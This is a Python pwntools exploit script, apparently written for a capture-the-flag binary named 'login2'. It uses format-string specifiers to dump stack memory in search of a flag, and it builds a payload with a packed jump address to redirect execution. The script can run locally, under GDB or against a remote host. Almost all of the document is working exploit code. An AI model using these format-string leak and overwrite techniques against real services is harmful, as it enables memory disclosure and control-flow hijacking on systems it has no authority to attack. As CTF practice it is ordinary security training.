from pwn import *


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# GDB script
gdb_script = """
b *0x08049285
b *0x08049320
b *0x08049360
b *0x08049335
continue
"""

# Prepare program
exe = "./login2"
context.binary = binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"


# Buffer size is 39, only 13 of these printed!
def dump_stack():
    found_flag = ""
    for i in range(0, 100):
        try:
            io = start()
            res = io.recvlines(1)
            # info(res)
            # &favourite_number = 0x0804a044
            io.sendline(f"%{i}$p| %{i}$s".encode("latin-1"))
            # res = io.recvuntil(b"\n")
            res = io.recvall()
            if str(res).find("flag") != -1:
                found_flag = str(res)
            print(f"{i} : {str(res)}")
            # print(f"{i} : {str(res).encode("latin-1")}")

            print(50 * "-" + "\n")
        # info(res)
        except Exception as err:
            print(err)

    print("Flag: " + found_flag)


# dump_stack()
# 0x0804a000
# 0xffc45438
# 0x080487e0


def exploit():
    # password_addr = 0xFFFFCC6C
    target_addr = 0x08049285
    buff_addr = 0x0804A044
    jmp_addr = 0x0804933D
    # loc = 0x0804A044 - 0x8048719
    io = start()
    res = io.recvlines(1)
    print(res)
    # payload = b""
    # fake_password = b"FAKEPASSWORD"
    # payload += fake_password

    # info(res)
    # This works! Padd it with 4 bytes
    # payload = b"    %4$n    "
    payload = b"    %4$s    "
    payload += p32(jmp_addr, "little")
    print("Payload: ")
    print(payload)

    io.sendline(payload)
    # res = io.recvuntil(b"\n")
    # io.interactive()
    res = io.recvall()
    info(res)
    print(res)
    if str(res).find("flag") != -1:
        found_flag = str(res)
    # print(f"{i} : {str(res).encode("latin-1")}")

    print(50 * "-" + "\n")


exploit()
